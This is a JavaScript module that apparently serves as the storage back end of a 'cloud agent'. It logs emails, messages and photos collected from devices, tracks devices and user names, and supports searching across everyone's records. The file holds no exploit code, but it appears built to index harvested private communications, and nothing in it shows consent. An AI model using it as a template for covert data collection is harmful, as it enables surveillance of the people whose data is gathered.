// 📊 NUPI Cloud Agent - Database Storage System
// Stores all collected user data for historical access

const fs = require('fs');
const path = require('path');

const DB_PATH = path.join(__dirname, 'nupi_data.json');

class NupiDatabase {
    constructor() {
        this.data = this.loadDatabase();
    }

    loadDatabase() {
        try {
            if (fs.existsSync(DB_PATH)) {
                const raw = fs.readFileSync(DB_PATH, 'utf8');
                return JSON.parse(raw);
            }
        } catch (error) {
            console.log('Creating new database...');
        }
        return {
            collections: [],
            devices: {},
            users: {},
            totalRecords: 0
        };
    }

    saveDatabase() {
        try {
            fs.writeFileSync(DB_PATH, JSON.stringify(this.data, null, 2));
            return true;
        } catch (error) {
            console.error('Database save error:', error);
            return false;
        }
    }

    // Store collected data
    storeCollection(collectionData) {
        const record = {
            id: `${collectionData.deviceId}_${Date.now()}`,
            ...collectionData,
            stored: new Date().toISOString()
        };

        this.data.collections.push(record);
        this.data.totalRecords++;

        // Update device tracking
        if (!this.data.devices[collectionData.deviceId]) {
            this.data.devices[collectionData.deviceId] = {
                deviceId: collectionData.deviceId,
                agentId: collectionData.agentId,
                firstSeen: new Date().toISOString(),
                lastSeen: new Date().toISOString(),
                totalCollections: 0,
                userName: collectionData.userName || null
            };
        }
        
        this.data.devices[collectionData.deviceId].lastSeen = new Date().toISOString();
        this.data.devices[collectionData.deviceId].totalCollections++;
        
        // Update user name if found
        if (collectionData.userName) {
            this.data.devices[collectionData.deviceId].userName = collectionData.userName;
            
            if (!this.data.users[collectionData.userName]) {
                this.data.users[collectionData.userName] = {
                    name: collectionData.userName,
                    devices: [],
                    firstSeen: new Date().toISOString(),
                    totalData: 0
                };
            }
            
            if (!this.data.users[collectionData.userName].devices.includes(collectionData.deviceId)) {
                this.data.users[collectionData.userName].devices.push(collectionData.deviceId);
            }
            
            this.data.users[collectionData.userName].totalData++;
        }

        this.saveDatabase();
        return record;
    }

    // Get all data for device
    getDeviceData(deviceId, limit = 50) {
        const records = this.data.collections.filter(c => c.deviceId === deviceId);
        return records.slice(-limit).reverse();
    }

    // Get latest data for device (EMERGENCY ACCESS)
    getLatestDeviceData(deviceId) {
        const records = this.data.collections.filter(c => c.deviceId === deviceId);
        return records[records.length - 1] || null;
    }

    // Search all data
    search(query, type = null) {
        const results = [];
        
        this.data.collections.forEach(collection => {
            // Search emails
            if ((!type || type === 'email') && collection.emails) {
                collection.emails.forEach(email => {
                    const emailStr = JSON.stringify(email).toLowerCase();
                    if (emailStr.includes(query.toLowerCase())) {
                        results.push({
                            type: 'email',
                            data: email,
                            deviceId: collection.deviceId,
                            userName: collection.userName,
                            collected: collection.timestamp
                        });
                    }
                });
            }

            // Search messages
            if ((!type || type === 'message') && collection.messages) {
                collection.messages.forEach(message => {
                    const msgStr = JSON.stringify(message).toLowerCase();
                    if (msgStr.includes(query.toLowerCase())) {
                        results.push({
                            type: 'message',
                            data: message,
                            deviceId: collection.deviceId,
                            userName: collection.userName,
                            collected: collection.timestamp
                        });
                    }
                });
            }

            // Search photos
            if ((!type || type === 'photo') && collection.photos) {
                collection.photos.forEach(photo => {
                    const photoStr = JSON.stringify(photo).toLowerCase();
                    if (photoStr.includes(query.toLowerCase())) {
                        results.push({
                            type: 'photo',
                            data: photo,
                            deviceId: collection.deviceId,
                            userName: collection.userName,
                            collected: collection.timestamp
                        });
                    }
                });
            }
        });

        return results;
    }

    // Get all devices
    getAllDevices() {
        return Object.values(this.data.devices);
    }

    // Get all users
    getAllUsers() {
        return Object.values(this.data.users);
    }

    // Get stats
    getStats() {
        return {
            totalRecords: this.data.totalRecords,
            totalDevices: Object.keys(this.data.devices).length,
            totalUsers: Object.keys(this.data.users).length,
            totalEmails: this.data.collections.reduce((sum, c) => sum + (c.emails?.length || 0), 0),
            totalMessages: this.data.collections.reduce((sum, c) => sum + (c.messages?.length || 0), 0),
            totalPhotos: this.data.collections.reduce((sum, c) => sum + (c.photos?.length || 0), 0),
            lastCollection: this.data.collections[this.data.collections.length - 1]?.timestamp || null
        };
    }

    // Get real-time stream (last N records)
    getRealTimeStream(limit = 10) {
        return this.data.collections.slice(-limit).reverse();
    }

    // Get user by name
    getUserData(userName) {
        const user = this.data.users[userName];
        if (!user) return null;

        const userData = {
            ...user,
            devices: user.devices.map(deviceId => this.data.devices[deviceId]),
            recentCollections: []
        };

        // Get recent collections from this user's devices
        user.devices.forEach(deviceId => {
            const deviceCollections = this.getDeviceData(deviceId, 10);
            userData.recentCollections.push(...deviceCollections);
        });

        return userData;
    }
}

module.exports = new NupiDatabase();
